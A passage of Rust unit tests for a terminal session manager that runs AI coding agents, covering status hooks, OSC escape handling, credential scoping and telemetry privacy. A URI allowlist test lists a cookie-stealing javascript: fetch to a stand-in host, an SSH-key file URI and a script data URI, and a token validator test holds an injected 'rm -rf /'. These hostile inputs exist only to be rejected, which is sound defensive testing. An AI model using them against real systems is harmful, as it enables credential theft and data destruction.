fn claude_notification_permission_sets_partial_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-claude-1",
        "claude",
        "Notification:permission_prompt",
        None,
        std::time::Instant::now(),
    );
    let a = session.authority.as_ref().expect("authority set");
    assert_eq!(a.source_id, "hook-claude-1");
    assert_eq!(a.mapped_state, RawAgentState::Blocked);
    assert!(a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Partial);
}

#[cfg(feature = "codex-app-server-authority")]
#[test]
fn codex_app_server_event_sets_complete_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "app-server-codex-1",
        "codex-app-server",
        "turn/started",
        None,
        std::time::Instant::now(),
    );
    let a = session.authority.as_ref().expect("authority set");
    assert_eq!(a.source_id, "app-server-codex-1");
    assert_eq!(a.mapped_state, RawAgentState::Working);
    assert!(!a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Complete);
}

#[test]
fn clear_event_drops_authority_for_source() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "tool.execute.before",
        None,
        now,
    );
    assert!(session.authority.is_some());
    session.apply_runtime_event("hook-opencode-1", "opencode", "session.error", None, now);
    assert!(session.authority.is_none());
}

#[test]
fn clear_from_other_source_leaves_authority() {
    // A Clear from a different source_id must not drop the live authority — the
    // source guard keeps one reporter from clearing another's state.
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "tool.execute.before",
        None,
        now,
    );
    session.apply_runtime_event("hook-opencode-2", "opencode", "session.error", None, now);
    let a = session.authority.as_ref().expect("authority survives");
    assert_eq!(a.source_id, "hook-opencode-1");
}

#[test]
fn heartbeat_from_other_source_does_not_refresh_last_event() {
    use std::time::Duration;
    let mut session = test_session_with_policy(OscPolicy::default());
    let t0 = std::time::Instant::now();
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "tool.execute.before",
        None,
        t0,
    );
    let original = session.authority.as_ref().unwrap().last_event;
    // A heartbeat (claude lifecycle event) from a different source must not
    // refresh source-1's freshness, or a stale authority could outlive its TTL.
    session.apply_runtime_event(
        "hook-claude-9",
        "claude",
        "PreToolUse",
        None,
        t0 + Duration::from_secs(5),
    );
    assert_eq!(session.authority.as_ref().unwrap().last_event, original);
}

#[test]
fn amp_event_sets_partial_authority() {
    use crate::agent_status::evidence::AuthorityGrade;
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-amp-1",
        "amp",
        "tool-start",
        None,
        std::time::Instant::now(),
    );
    let a = session.authority.as_ref().expect("amp authority set");
    // amp has partial lifecycle coverage, so it cannot author at full confidence.
    assert_eq!(a.grade, AuthorityGrade::Partial);
}

#[test]
fn osc_title_captured_and_capped() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let long = "x".repeat(400);
    session.feed_pty(format!("\x1b]2;{long}\x07").as_bytes());
    let osc = session.osc_evidence();
    assert_eq!(
        osc.title.as_ref().map(|t| t.chars().count()),
        Some(256),
        "title retained and capped at 256 chars"
    );
}

#[test]
fn osc94_progress_active_then_clear() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]9;4;1;50\x07");
    assert!(
        session.osc_evidence().progress_active,
        "OSC 9;4 state 1 marks progress active"
    );
    session.feed_pty(b"\x1b]9;4;0\x07");
    assert!(!session.osc_evidence().progress_active);
    assert!(session.osc_evidence().progress_cleared_at.is_some());
}

#[test]
fn osc133_marks_set_shell_state() {
    use crate::agent_status::evidence::RawAgentState;
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]133;C\x07");
    assert_eq!(
        session.osc_evidence().shell_state,
        Some(RawAgentState::Working)
    );
    assert!(session.osc_evidence().shell_state_marked_at.is_some());
    session.feed_pty(b"\x1b]133;B\x07");
    assert_eq!(
        session.osc_evidence().shell_state,
        Some(RawAgentState::Idle)
    );
}

#[test]
fn process_evidence_unavailable_without_child_pid() {
    // Test sessions have no real child PID; sampling must report "no physics"
    // (never a false exit), so the watchdog can't demote off this evidence.
    let mut session = test_session_with_policy(OscPolicy::default());
    let ev = session.sample_process_evidence(std::time::Instant::now());
    assert!(!ev.physics_sampled);
    assert!(!ev.process_exited);
    assert!(!ev.foreground_is_agent);
}

#[test]
fn clear_runtime_authority_drops_state_and_counters() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "permission.asked",
        None,
        std::time::Instant::now(),
    );
    assert!(session.authority.is_some());
    session.clear_runtime_authority();
    assert!(session.authority.is_none());
    assert_eq!(session.subagents_active, 0);
}

#[test]
fn agent_session_gets_status_reporter_env() {
    let mut cmd = CommandBuilder::new("/bin/true");
    inject_status_env(&mut cmd, 42, Some("codex"), None, "test-capability");
    let get = |k| cmd.get_env(k).and_then(|v| v.to_str());
    assert_eq!(get(jackin_protocol::SESSION_ID_ENV), Some("42"));
    assert_eq!(get(jackin_protocol::ISOLATION_SESSION_ID_ENV), Some("42"));
    assert_eq!(get("JACKIN_AGENT_RUNTIME"), Some("codex"));
    assert_eq!(get("JACKIN_STATUS_SOURCE"), Some("hook-codex-42"));
    assert_eq!(get("JACKIN_STATUS_SOCKET"), Some("/jackin/run/jackin.sock"));
    assert_eq!(
        get(jackin_protocol::SESSION_CAPABILITY_ENV),
        Some("test-capability")
    );
    assert_eq!(get("TMPDIR"), Some("/jackin/run/sessions/42/tmp"));
    assert_eq!(
        get("JACKIN_SESSION_STATE_DIR"),
        Some("/jackin/run/sessions/42/state")
    );
    assert_eq!(get("XDG_CACHE_HOME"), Some("/jackin/run/sessions/42/cache"));
}

#[test]
fn configured_xdg_cache_root_overrides_session_cache() {
    let mut cmd = CommandBuilder::new("/bin/true");
    inject_status_env(
        &mut cmd,
        42,
        Some("amp"),
        Some("/home/agent/.cache/amp"),
        "test-capability",
    );
    assert_eq!(
        cmd.get_env("XDG_CACHE_HOME")
            .and_then(|value| value.to_str()),
        Some("/home/agent/.cache/amp")
    );
}

#[test]
fn shell_session_gets_private_paths_and_no_agent_status_identity() {
    let mut cmd = CommandBuilder::new("/bin/zsh");
    inject_status_env(&mut cmd, 7, None, None, "shell-capability");
    assert!(cmd.get_env(jackin_protocol::SESSION_ID_ENV).is_none());
    assert_eq!(
        cmd.get_env(jackin_protocol::ISOLATION_SESSION_ID_ENV)
            .and_then(|v| v.to_str()),
        Some("7")
    );
    assert!(cmd.get_env("JACKIN_AGENT_RUNTIME").is_none());
    assert!(cmd.get_env("JACKIN_STATUS_SOURCE").is_none());
    assert_eq!(
        cmd.get_env("JACKIN_STATUS_SOCKET").and_then(|v| v.to_str()),
        Some("/jackin/run/jackin.sock")
    );
    assert_eq!(
        cmd.get_env(jackin_protocol::SESSION_CAPABILITY_ENV)
            .and_then(|v| v.to_str()),
        Some("shell-capability")
    );
}

#[test]
fn osc8_uri_empty_is_safe() {
    // Empty URI = link terminator; must always pass.
    assert!(osc8_uri_is_safe(""));
}

#[test]
fn osc8_uri_http_https_mailto_pass() {
    assert!(osc8_uri_is_safe("http://example.com"));
    assert!(osc8_uri_is_safe("https://example.com"));
    assert!(osc8_uri_is_safe("HTTPS://EXAMPLE.COM"));
    assert!(osc8_uri_is_safe("mailto:foo@example.com"));
}

#[test]
fn osc8_uri_unsafe_schemes_rejected() {
    // The threat scenarios the allowlist is here to block.
    assert!(!osc8_uri_is_safe(
        "javascript:fetch('//evil/?'+document.cookie)"
    ));
    assert!(!osc8_uri_is_safe("file:///Users/operator/.ssh/id_rsa"));
    assert!(!osc8_uri_is_safe(
        "data:text/html,<script>alert(1)</script>"
    ));
    assert!(!osc8_uri_is_safe("ssh://server"));
}

#[test]
fn validate_spawn_token_syntax_rejects_typical_attacks() {
    validate_spawn_token_syntax("").unwrap_err();
    validate_spawn_token_syntax("--debug").unwrap_err();
    validate_spawn_token_syntax("claude\n; rm -rf /").unwrap_err();
    validate_spawn_token_syntax("claude codex").unwrap_err();
    validate_spawn_token_syntax("claude\0").unwrap_err();
}

#[test]
fn validate_spawn_token_syntax_accepts_well_formed_tokens() {
    validate_spawn_token_syntax("claude").unwrap();
    validate_spawn_token_syntax("work@claude").unwrap();
    validate_spawn_token_syntax("codex").unwrap();
}

// ── exit-reason classification ────────────────────────────────────────────
// `child_exit_reason` drives whether a session exit surfaces as a Shutdown
// reason (operator-facing error) or a clean teardown. A regression that
// reported `Some(..)` on a clean exit would turn every normal `/exit` into a
// spurious error dialog + container teardown notice.

#[test]
fn child_exit_reason_clean_exit_is_none() {
    let status = portable_pty::ExitStatus::with_exit_code(0);
    assert_eq!(child_exit_reason(Ok(&status)), None);
}

#[test]
fn child_exit_reason_nonzero_code_reports_code() {
    let status = portable_pty::ExitStatus::with_exit_code(137);
    assert_eq!(
        child_exit_reason(Ok(&status)).as_deref(),
        Some("session process exited with code 137")
    );
}

#[test]
fn child_exit_reason_signal_reports_signal() {
    let status = portable_pty::ExitStatus::with_signal("SIGKILL");
    assert_eq!(
        child_exit_reason(Ok(&status)).as_deref(),
        Some("session process exited after signal SIGKILL")
    );
}

#[test]
fn child_exit_reason_wait_error_reports_failure() {
    let err = std::io::Error::other("boom");
    let reason = child_exit_reason(Err(&err)).expect("a wait error must yield a reason");
    assert!(reason.starts_with("session process wait failed:"));
    assert!(reason.contains("boom"));
}

#[test]
fn pty_exit_reason_covers_the_closed_registry() {
    use jackin_telemetry::schema::enums::{ErrorType, PtyExitReason};

    let clean = portable_pty::ExitStatus::with_exit_code(0);
    let nonzero = portable_pty::ExitStatus::with_exit_code(7);
    let signal = portable_pty::ExitStatus::with_signal("SIGTERM");
    let wait_error = std::io::Error::other("wait failed");
    assert_eq!(pty_exit_reason(Ok(&clean), false), PtyExitReason::Clean);
    assert_eq!(
        pty_exit_reason(Ok(&nonzero), false),
        PtyExitReason::NonzeroExit
    );
    assert_eq!(pty_exit_reason(Ok(&signal), false), PtyExitReason::Signal);
    assert_eq!(
        pty_exit_reason(Err(&wait_error), false),
        PtyExitReason::WaitFailed
    );
    assert_eq!(pty_exit_reason(Ok(&clean), true), PtyExitReason::Cancelled);
    assert_eq!(pty_exit_error_type(PtyExitReason::Clean), None);
    assert_eq!(pty_exit_error_type(PtyExitReason::Cancelled), None);
    assert_eq!(
        pty_exit_error_type(PtyExitReason::Signal),
        Some(ErrorType::ProcessExitNonzero)
    );
    assert_eq!(
        pty_exit_error_type(PtyExitReason::NonzeroExit),
        Some(ErrorType::ProcessExitNonzero)
    );
    assert_eq!(
        pty_exit_error_type(PtyExitReason::WaitFailed),
        Some(ErrorType::IoError)
    );
}

#[test]
fn pty_spawn_exit_pair_is_bounded_and_does_not_export_wait_errors() {
    let (export, subscriber) = jackin_diagnostics::observability::test_capsule_layers(false);
    let private_error = std::io::Error::other("private PTY bytes and /private/workspace");
    tracing::subscriber::with_default(subscriber, || {
        emit_pty_spawn(Some("codex"), Some("conversation-proof"));
        emit_pty_exit(
            Some("codex"),
            Some("conversation-proof"),
            Err(&private_error),
            false,
        );
    });
    export.force_flush();

    assert_eq!(export.event_count("pty.spawn"), 1);
    assert_eq!(export.event_count("pty.exit"), 1);
    assert!(export.contains_log_text("wait_failed"));
    assert!(export.contains_log_text("io_error"));
    assert!(export.contains_log_text("codex"));
    assert!(export.contains_log_text("conversation-proof"));
    assert!(!export.contains_log_text("private PTY bytes"));
    assert!(!export.contains_log_text("/private/workspace"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn spawn_keeps_provider_route_with_same_agent_instance_and_account() {
    let (event_tx, _event_rx) = mpsc::unbounded_channel();
    let slots = [
        (
            "codex-work",
            "openai-work",
            "Codex · Work",
            "https://work.example.test/v1",
            2_001,
        ),
        (
            "codex-personal",
            "openai-personal",
            "Codex · Personal",
            "https://personal.example.test/v1",
            2_002,
        ),
    ];

    let mut sessions = Vec::with_capacity(slots.len());
    for (instance_id, account_id, label, endpoint, uid) in slots {
        let mut command = CommandBuilder::new("/bin/sh");
        command.arg("-c");
        command.arg("exit 0");
        let (session, _id) = Session::spawn(
            SessionSpawnSpec {
                label: label.to_owned(),
                agent: Some(instance_id.to_owned()),
                account_id: Some(account_id.to_owned()),
                identity: jackin_protocol::SessionIdentity { uid, gid: uid },
                provider: Some(super::SessionProvider {
                    label: "OpenAI".to_owned(),
                    env_overrides: vec![("OPENAI_BASE_URL".to_owned(), endpoint.to_owned())],
                }),
                cache_dir: None,
            },
            command,
            SessionTerminal {
                rows: 24,
                cols: 80,
                row_arena: termpane::RowArena::default(),
                default_fg: None,
                default_bg: None,
            },
            event_tx.clone(),
        )
        .expect("spawn real PTY session");
        sessions.push(session);
    }

    for (session, (instance_id, account_id, label, endpoint, uid)) in sessions.iter().zip(slots) {
        assert_eq!(session.label, label);
        // `Session.agent` stores the stable instance configuration ID, not
        // the shared executable slug (`codex`).
        assert_eq!(session.agent.as_deref(), Some(instance_id));
        assert_eq!(session.account_id.as_deref(), Some(account_id));
        assert_eq!(session.identity.uid, uid);
        let provider = session.provider.as_ref().expect("provider route retained");
        assert_eq!(provider.label, "OpenAI");
        assert_eq!(
            provider.env_overrides,
            vec![("OPENAI_BASE_URL".to_owned(), endpoint.to_owned())]
        );
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn conformance_wire_real_pty_spawn_stream_and_exit_exclude_private_content() {
    if crate::process_telemetry::run_wire_test_in_child(
        "session::tests::conformance_wire_real_pty_spawn_stream_and_exit_exclude_private_content",
        "JACKIN_SESSION_WIRE_CHILD",
    )
    .expect("dispatch isolated session wire test")
    {
        return;
    }
    let _telemetry_guard = crate::test_support::telemetry_test_guard_async().await;
    let testbed = jackin_otlp_testbed::Testbed::start().expect("start OTLP testbed");
    jackin_diagnostics::init_wire_test_export(
        &testbed.endpoint(),
        jackin_diagnostics::ServiceIdentity::CAPSULE,
    )
    .expect("initialize wire test export");
    let (event_tx, mut event_rx) = mpsc::unbounded_channel();
    let mut command = CommandBuilder::new("/bin/sh");
    command.arg("-c");
    command.arg("printf wire-private-pty-output; exit 17");
    let terminal = SessionTerminal {
        rows: 24,
        cols: 80,
        row_arena: termpane::RowArena::default(),
        default_fg: None,
        default_bg: None,
    };

    let (_session, session_id) = Session::spawn(
        SessionSpawnSpec {
            label: "wire-private-tab-label".to_owned(),
            agent: Some("codex".to_owned()),
            account_id: Some("acc-codex".to_owned()),
            identity: jackin_protocol::SessionIdentity {
                uid: 2_002,
                gid: 2_002,
            },
            provider: None,
            cache_dir: None,
        },
        command,
        terminal,
        event_tx,
    )
    .expect("spawn real PTY session");
    let exit_reason = tokio::time::timeout(std::time::Duration::from_secs(2), async {
        loop {
            if let Some(SessionEvent::Exited {
                session_id: exited_id,
                reason,
            }) = event_rx.recv().await
            {
                assert_eq!(exited_id, session_id);
                break reason;
            }
        }
    })
    .await
    .expect("PTY session exits before deadline");
    assert_eq!(
        exit_reason.as_deref(),
        Some("session process exited with code 17")
    );
    jackin_diagnostics::flush_wire_test_export().expect("flush wire test export");

    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
    let records = loop {
        let records = testbed
            .log_records()
            .into_iter()
            .filter(|record| matches!(record.event_name.as_str(), "pty.spawn" | "pty.exit"))
            .collect::<Vec<_>>();
        if records.len() == 2 {
            break records;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "PTY spawn and exit wire events did not arrive exactly once"
        );
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
    };
    let wire_text = format!("{records:?}");
    for expected in ["pty.spawn", "pty.exit", "nonzero_exit", "codex", "17"] {
        assert!(
            wire_text.contains(expected),
            "missing {expected}: {wire_text}"
        );
    }
    let prohibited = [
        "wire-private-pty-output",
        "wire-private-tab-label",
        "printf wire-private-pty-output",
        "/bin/sh",
    ];
    for value in prohibited {
        assert!(!wire_text.contains(value), "exported {value}");
    }
    assert_eq!(
        testbed.prohibited_value_violations(&prohibited),
        Vec::<String>::new()
    );
    assert_eq!(testbed.legacy_namespace_violations(), Vec::<String>::new());
    jackin_diagnostics::shutdown_capsule_tracing();
}

#[test]
fn terminate_marks_the_live_exit_as_cancelled() {
    let (input_tx, _input_rx) = mpsc::unbounded_channel();
    let session = Session::new_for_test(
        "test".to_owned(),
        None,
        None,
        (24, 80),
        0,
        input_tx,
        Arc::new(Mutex::new(Box::new(NullMasterPty))),
        Arc::new(Mutex::new(Box::new(NullChildKiller))),
    );
    session.terminate();
    assert!(
        session
            .termination_requested
            .load(std::sync::atomic::Ordering::Acquire)
    );
}

// ── diagnostic tail ───────────────────────────────────────────────────────

#[test]
fn diagnostic_tail_zero_rows_is_none() {
    let session = test_session_with_policy(OscPolicy::default());
    assert_eq!(session.diagnostic_tail(0), None);
}

#[test]
fn diagnostic_tail_blank_pane_is_none() {
    let session = test_session_with_policy(OscPolicy::default());
    assert_eq!(session.diagnostic_tail(12), None);
}

#[test]
fn diagnostic_tail_returns_last_nonblank_rows_oldest_first() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"alpha\r\nbravo\r\ncharlie\r\n");
    let tail = session
        .diagnostic_tail(2)
        .expect("rendered rows must yield a tail");
    assert_eq!(tail, "bravo\ncharlie");
}

// --- plan 033 suite C: PTY fault recovery (FaultMasterPty) ---
// Poisoned-mutex arms are MISSING (require a panicked holder thread).

struct FaultMasterPty {
    take_writer_err: Option<std::io::ErrorKind>,
    clone_reader_err: Option<std::io::ErrorKind>,
    writer_fails_after: Option<usize>,
    reader_yields: Vec<Result<Vec<u8>, std::io::ErrorKind>>,
    write_count: Arc<std::sync::atomic::AtomicUsize>,
    reader_idx: Arc<std::sync::atomic::AtomicUsize>,
}

impl Default for FaultMasterPty {
    fn default() -> Self {
        Self {
            take_writer_err: None,
            clone_reader_err: None,
            writer_fails_after: None,
            reader_yields: Vec::new(),
            write_count: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
            reader_idx: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
        }
    }
}

struct FaultWriter {
    fails_after: Option<usize>,
    count: Arc<std::sync::atomic::AtomicUsize>,
}

impl std::io::Write for FaultWriter {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        use std::sync::atomic::Ordering;
        let n = self.count.fetch_add(1, Ordering::SeqCst);
        if self.fails_after.is_some_and(|after| n >= after) {
            return Err(std::io::Error::from(std::io::ErrorKind::BrokenPipe));
        }
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

struct FaultReader {
    yields: Vec<Result<Vec<u8>, std::io::ErrorKind>>,
    idx: Arc<std::sync::atomic::AtomicUsize>,
}

impl std::io::Read for FaultReader {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        use std::sync::atomic::Ordering;
        let i = self.idx.fetch_add(1, Ordering::SeqCst);
        if i >= self.yields.len() {
            return Ok(0);
        }
        match &self.yields[i] {
            Ok(data) => {
                let n = data.len().min(buf.len());
                buf[..n].copy_from_slice(&data[..n]);
                Ok(n)
            }
            Err(kind) => Err(std::io::Error::from(*kind)),
        }
    }
}

impl MasterPty for FaultMasterPty {
    fn resize(&self, _size: PtySize) -> Result<()> {
        Ok(())
    }
    fn get_size(&self) -> Result<PtySize> {
        Ok(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
    }
    fn try_clone_reader(&self) -> Result<Box<dyn std::io::Read + Send>> {
        if let Some(kind) = self.clone_reader_err {
            return Err(anyhow::anyhow!(std::io::Error::from(kind)));
        }
        Ok(Box::new(FaultReader {
            yields: self.reader_yields.clone(),
            idx: Arc::clone(&self.reader_idx),
        }))
    }
    fn take_writer(&self) -> Result<Box<dyn std::io::Write + Send>> {
        if let Some(kind) = self.take_writer_err {
            return Err(anyhow::anyhow!(std::io::Error::from(kind)));
        }
        Ok(Box::new(FaultWriter {
            fails_after: self.writer_fails_after,
            count: Arc::clone(&self.write_count),
        }))
    }
    #[cfg(unix)]
    fn process_group_leader(&self) -> Option<libc::pid_t> {
        None
    }
    #[cfg(unix)]
    fn as_raw_fd(&self) -> Option<portable_pty::unix::RawFd> {
        None
    }
    #[cfg(unix)]
    fn tty_name(&self) -> Option<std::path::PathBuf> {
        None
    }
}

/// Start the same writer/reader `spawn_blocking` tasks [`Session::spawn`] uses,
/// against a scripted `FaultMasterPty`, so recovery branches are reachable.
fn start_fault_pty_tasks(
    fault: FaultMasterPty,
) -> (
    mpsc::UnboundedSender<Vec<u8>>,
    mpsc::UnboundedReceiver<SessionEvent>,
) {
    let master: Arc<Mutex<Box<dyn MasterPty + Send>>> = Arc::new(Mutex::new(Box::new(fault)));
    let master_for_write = Arc::clone(&master);
    let master_for_read = Arc::clone(&master);
    let (input_tx, mut input_rx) = mpsc::unbounded_channel::<Vec<u8>>();
    let (event_tx, event_rx) = mpsc::unbounded_channel::<SessionEvent>();
    let sid = 1u64;
    let event_tx_writer_err = event_tx.clone();
    tokio::task::spawn_blocking(move || {
        let writer = master_for_write
            .lock()
            .ok()
            .and_then(|guard| guard.take_writer().ok());
        let Some(mut writer) = writer else {
            drop(event_tx_writer_err.send(SessionEvent::Exited {
                session_id: sid,
                reason: Some("session PTY writer failed to initialize".to_owned()),
            }));
            return;
        };
        while let Some(data) = input_rx.blocking_recv() {
            if let Err(e) = std::io::Write::write_all(&mut writer, &data) {
                drop(event_tx_writer_err.send(SessionEvent::Exited {
                    session_id: sid,
                    reason: Some(format!("session PTY write failed: {e}")),
                }));
                return;
            }
        }
    });
    let event_tx_reader_err = event_tx.clone();
    tokio::task::spawn_blocking(move || {
        let reader = master_for_read
            .lock()
            .ok()
            .and_then(|guard| guard.try_clone_reader().ok());
        let Some(mut reader) = reader else {
            drop(event_tx_reader_err.send(SessionEvent::Exited {
                session_id: sid,
                reason: Some("session PTY reader failed to initialize".to_owned()),
            }));
            return;
        };
        let mut buf = [0u8; 4096];
        loop {
            match std::io::Read::read(&mut reader, &mut buf) {
                Ok(0) => break,
                Ok(_) => {}
                Err(_) => break, // read error: no Exited (reaper is authoritative)
            }
        }
    });
    (input_tx, event_rx)
}

#[tokio::test]
async fn writer_init_failure_emits_exited_with_reason() {
    let fault = FaultMasterPty {
        take_writer_err: Some(std::io::ErrorKind::PermissionDenied),
        ..Default::default()
    };
    let (_input_tx, mut event_rx) = start_fault_pty_tasks(fault);
    let ev = tokio::time::timeout(std::time::Duration::from_secs(2), event_rx.recv())
        .await
        .expect("timeout")
        .expect("channel closed");
    match ev {
        SessionEvent::Exited { reason, .. } => {
            assert_eq!(
                reason.as_deref(),
                Some("session PTY writer failed to initialize")
            );
        }
        other => panic!("expected Exited, got {other:?}"),
    }
}

#[tokio::test]
async fn reader_init_failure_emits_exited_with_reason() {
    let fault = FaultMasterPty {
        clone_reader_err: Some(std::io::ErrorKind::PermissionDenied),
        ..Default::default()
    };
    let (_input_tx, mut event_rx) = start_fault_pty_tasks(fault);
    let ev = tokio::time::timeout(std::time::Duration::from_secs(2), event_rx.recv())
        .await
        .expect("timeout")
        .expect("channel closed");
    match ev {
        SessionEvent::Exited { reason, .. } => {
            assert_eq!(
                reason.as_deref(),
                Some("session PTY reader failed to initialize")
            );
        }
        other => panic!("expected Exited, got {other:?}"),
    }
}

#[tokio::test]
async fn mid_stream_write_failure_emits_exited() {
    let fault = FaultMasterPty {
        writer_fails_after: Some(0),
        ..Default::default()
    };
    let (input_tx, mut event_rx) = start_fault_pty_tasks(fault);
    input_tx.send(b"x".to_vec()).expect("input channel open");
    let ev = tokio::time::timeout(std::time::Duration::from_secs(2), event_rx.recv())
        .await
        .expect("timeout")
        .expect("channel closed");
    match ev {
        SessionEvent::Exited { reason, .. } => {
            let r = reason.expect("reason");
            assert!(
                r.starts_with("session PTY write failed:"),
                "unexpected reason: {r}"
            );
        }
        other => panic!("expected Exited, got {other:?}"),
    }
}

#[tokio::test]
async fn read_error_breaks_without_exited_event() {
    let fault = FaultMasterPty {
        reader_yields: vec![Err(std::io::ErrorKind::BrokenPipe)],
        ..Default::default()
    };
    let (_input_tx, mut event_rx) = start_fault_pty_tasks(fault);
    // Reader should break without Exited; give tasks a moment then try_recv.
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    assert!(
        event_rx.try_recv().is_err(),
        "read error must not emit Exited (reaper is authoritative)"
    );
}

#[test]
fn bare_claude_notification_payload_authors_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-claude-1",
        "claude",
        "Notification",
        Some(r#"{"notification_type":"permission_prompt"}"#),
        std::time::Instant::now(),
    );
    let a = session
        .authority
        .as_ref()
        .expect("authority set from payload subtype");
    assert_eq!(a.mapped_state, RawAgentState::Blocked);
    assert!(a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Partial);
}

fn v2_credentials_fixture() -> jackin_protocol::AgentCredentialEnv {
    serde_json::from_value(serde_json::json!({
        "schema_version": 2,
        "instances": {
            "opencode-personal": {
                "agent": "opencode",
                "account_id": "acc-personal",
                "env": {"ANTHROPIC_API_KEY": "personal-secret"},
            },
            "claude-work": {
                "agent": "claude",
                "account_id": "acc-work",
                "env": {"ANTHROPIC_API_KEY": "work-secret"},
            },
            "claude-personal": {
                "agent": "claude",
                "account_id": "acc-personal",
                "env": {"ANTHROPIC_API_KEY": "personal-secret"},
            },
        },
    }))
    .expect("v2 fixture must decode")
}

#[test]
fn account_credentials_are_scoped_to_selected_instance_and_mode() {
    let credentials = v2_credentials_fixture();
    let hostile_passthrough = vec![("ANTHROPIC_API_KEY".into(), "wrong-secret".into())];
    for mode in ["sync", "ignore"] {
        let mut cmd = build_agent_command(&spawn_spec(
            "claude",
            "claude-work",
            Some(mode),
            &hostile_passthrough,
        ));
        super::apply_account_env(&mut cmd, "claude-work", Some(mode), None, &credentials);
        assert!(cmd.get_env("ANTHROPIC_API_KEY").is_none());
    }
    let mut cmd = build_agent_command(&spawn_spec(
        "claude",
        "claude-work",
        Some("api_key"),
        &hostile_passthrough,
    ));
    super::apply_account_env(
        &mut cmd,
        "claude-work",
        Some("api_key"),
        Some("claude"),
        &credentials,
    );
    assert_eq!(
        cmd.get_env("ANTHROPIC_API_KEY").and_then(|v| v.to_str()),
        Some("work-secret")
    );
    assert!(cmd.get_env("OPENAI_API_KEY").is_none());
    // Same agent, sibling instance: only its own env lands, never the other
    // claude instance's secret.
    let mut cmd = build_agent_command(&spawn_spec(
        "claude",
        "claude-work",
        Some("api_key"),
        &hostile_passthrough,
    ));
    super::apply_account_env(
        &mut cmd,
        "claude-personal",
        Some("api_key"),
        Some("claude"),
        &credentials,
    );
    assert_eq!(
        cmd.get_env("ANTHROPIC_API_KEY").and_then(|v| v.to_str()),
        Some("personal-secret")
    );
    let shell = build_shell_command(
        &hostile_passthrough,
        Path::new("/workspace"),
        "test",
        jackin_protocol::SessionIdentity {
            uid: 2_000,
            gid: 2_000,
        },
    );
    assert!(shell.get_env("ANTHROPIC_API_KEY").is_none());
}

#[test]
fn account_env_injection_is_bounded_by_agent_provider_and_auth_family() {
    let credentials: jackin_protocol::AgentCredentialEnv =
        serde_json::from_value(serde_json::json!({
            "schema_version": 2,
            "instances": {
                "codex-routed": {
                    "agent": "codex",
                    "account_id": "acc-zai",
                    "env": {
                        "KIMI_API_KEY": "selected-routed-key",
                        "OPENAI_BASE_URL": "https://api.kimi.example/v1",
                        "CLAUDE_CODE_OAUTH_TOKEN": "foreign-claude-sentinel",
                        "GEMINI_API_KEY": "foreign-google-sentinel"
                    },
                },
                "opencode-routed": {
                    "agent": "opencode",
                    "account_id": "acc-anthropic",
                    "env": {
                        "ANTHROPIC_API_KEY": "selected-opencode-key",
                        "CLAUDE_CODE_OAUTH_TOKEN": "foreign-claude-sentinel"
                    },
                },
                "claude-oauth": {
                    "agent": "claude",
                    "account_id": "acc-claude",
                    "env": {
                        "CLAUDE_CODE_OAUTH_TOKEN": "selected-oauth-token",
                        "ANTHROPIC_BASE_URL": "https://anthropic.example",
                        "OPENAI_API_KEY": "foreign-codex-sentinel"
                    },
                },
                "claude-routed": {
                    "agent": "claude",
                    "account_id": "acc-zai",
                    "env": {
                        "ANTHROPIC_AUTH_TOKEN": "selected-zai-token",
                        "ANTHROPIC_BASE_URL": "https://api.z.ai/api/anthropic",
                        "OPENAI_API_KEY": "foreign-codex-sentinel"
                    },
                },
            },
        }))
        .expect("credential fixture must decode");
    let empty: Vec<(String, String)> = Vec::new();

    let mut codex = build_agent_command(&spawn_spec(
        "codex",
        "codex-routed",
        Some("api_key"),
        &empty,
    ));
    super::apply_account_env(
        &mut codex,
        "codex-routed",
        Some("api_key"),
        Some("kimi"),
        &credentials,
    );
    assert_eq!(
        codex
            .get_env("KIMI_API_KEY")
            .and_then(|value| value.to_str()),
        Some("selected-routed-key")
    );
    assert_eq!(
        codex
            .get_env("OPENAI_BASE_URL")
            .and_then(|value| value.to_str()),
        Some("https://api.kimi.example/v1")
    );
    assert!(codex.get_env("CLAUDE_CODE_OAUTH_TOKEN").is_none());
    assert!(codex.get_env("GEMINI_API_KEY").is_none());

    let mut opencode = build_agent_command(&spawn_spec(
        "opencode",
        "opencode-routed",
        Some("api_key"),
        &empty,
    ));
    super::apply_account_env(
        &mut opencode,
        "opencode-routed",
        Some("api_key"),
        Some("claude"),
        &credentials,
    );
    assert_eq!(
        opencode
            .get_env("ANTHROPIC_API_KEY")
